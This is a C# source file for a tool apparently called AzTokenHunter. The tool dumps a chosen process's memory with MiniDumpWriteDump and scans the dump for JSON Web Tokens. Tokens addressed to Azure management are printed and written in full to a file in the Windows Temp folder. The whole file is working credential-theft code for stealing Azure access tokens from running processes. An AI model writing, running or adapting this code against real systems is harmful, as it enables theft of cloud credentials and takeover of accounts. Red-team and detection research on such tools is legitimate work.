using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.IdentityModel.Tokens.Jwt;

namespace AzTokenHunter
{
    class Program
    {
        // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static string GenerateStringsOutput(string filePath)
        {
            StringBuilder toReturn = new StringBuilder();
            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                using (StreamReader streamReader = new StreamReader(fileStream))
                {
                    int currentByte;

                    while ((currentByte = streamReader.Read()) != -1)
                    {
                        if (currentByte >= 32 && currentByte <= 126)
                        {
                            toReturn.Append((char)currentByte);
                        }
                    }
                }
            }
            return toReturn.ToString();   
        }

        public static void AzTokenHunter(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Console.WriteLine("\n[X] Target process id is required!\n");
                return;
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(String.Format("\n[X]Exception: {0}\n", ex.Message));
                    return;
                }
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                return;
            }
            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);

            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if(bRet)
            {
                Console.WriteLine("[+] Dump successful!");
                string binaryAsStrings = GenerateStringsOutput(dumpFile);
                FindValidJWTs(binaryAsStrings);
                File.Delete(dumpFile);
                Console.WriteLine("[+] Deleted dump file.");
            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }
        }
        
        public static void FindValidJWTs(string input)
        {
            string pattern = @"\beyJ0[A-Za-z0-9-_\.]+[=]?\b"; //To-do: Improve regex search pattern
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            Regex regex = new Regex(pattern);
            MatchCollection matches = regex.Matches(input);
            foreach (Match match in matches)
            {
                try
                {
                    var jwtToken = new JwtSecurityToken(match.Value);
                    foreach (String s in jwtToken.Audiences)
                    {
                        if(isKnownToken(s))
                        {
                            //Console.WriteLine(String.Format("[+] Found Token {0}: {1}", s, match.Value));
                            Console.WriteLine(String.Format("[+] Found Token {0} - {1}", s, jwtToken.Payload.Iss));
                            String tokenPath = String.Format("{0}\\Temp\\token.out", systemRoot);
                            using (StreamWriter sw = File.AppendText(tokenPath)) {
                                sw.WriteLine("{0} - {1} - {2}", s, jwtToken.Payload.Iss, match.Value);
                            }
                        }
                    }
                }
                catch (Exception e) 
                { 
                
                }
            }
        }

        //To-do: Add other known microsoft audiences, like msgraph and vault
        public static bool isKnownToken(string audience) 
        {
            if (audience.Equals("https://management.core.windows.net/")) {
                return true;
            }
            return false;
        }

        static void Main(string[] args)
        {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
            if (!Directory.Exists(dumpDir))
            {
                Console.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
                return;
            }

            if (args.Length ==0)
            {
                // Fails without process id
                AzTokenHunter();
            }
            else if (args.Length == 1)
            {
                int retNum;
                if (int.TryParse(Convert.ToString(args[0]), System.Globalization.NumberStyles.Any, System.Globalization.NumberFormatInfo.InvariantInfo, out retNum))
                {
                    // arg is a number, so we're specifying a PID
                    AzTokenHunter(retNum);
                }
                else
                {
                    Console.WriteLine("\nPlease use \"AzTokenHunter.exe [pid]\" format\n");
                }
            }
            else if (args.Length == 2)
            {
                Console.WriteLine("\nPlease use \"AzTokenHunter.exe [pid]\" format\n");
            }
        }
    }
}
